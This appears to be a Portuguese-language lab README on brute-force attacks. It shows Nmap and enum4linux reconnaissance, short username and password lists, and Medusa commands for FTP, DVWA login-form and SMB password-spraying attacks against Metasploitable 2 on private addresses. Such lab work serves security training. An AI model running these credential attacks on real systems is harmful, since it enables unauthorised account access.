# 🔐 Brute Force Lab com Kali Linux + Medusa

## 📌 Descrição
Este projeto tem como objetivo simular ataques de força bruta em um ambiente controlado utilizando Kali Linux, Medusa e sistemas vulneráveis como Metasploitable 2 e DVWA.

---

## 🧪 Ambiente de Laboratório

| Máquina          | Função     | IP Exemplo        |
|-----------------|-----------|------------------|
| Kali Linux      | Atacante  | 192.168.56.101   |
| Metasploitable  | Alvo      | 192.168.56.102   |

---

## 🔍 Reconhecimento (Nmap)

```bash
nmap -sV 192.168.56.102
```

---

## 👤 Criação de Lista de Usuários

```bash
nano usuarios.txt
```

Conteúdo:

```
root
admin
user
msfadmin
postgres
service
test
```

---

## 📂 Criação de Wordlist

```bash
nano senhas.txt
```

Conteúdo:

```
123456
admin
password
msfadmin
12345678
```

---

## 💣 Ataque FTP

```bash
medusa -h 192.168.56.102 -u msfadmin -P senhas.txt -M ftp
```

---

## 🌐 Ataque Web (DVWA)

Acesso:
http://192.168.56.102/dvwa/login.php

```bash
medusa -h 192.168.56.102 -U usuarios.txt -P senhas.txt -M http -m FORM:"/dvwa/login.php:username=^USER^&password=^PASS^:F=Login failed"
```

---

## 🧠 Enumeração SMB

```bash
enum4linux 192.168.56.102
```

---

## 💥 Password Spraying SMB

```bash
medusa -h 192.168.56.102 -U usuarios.txt -p password -M smbnt
```

---
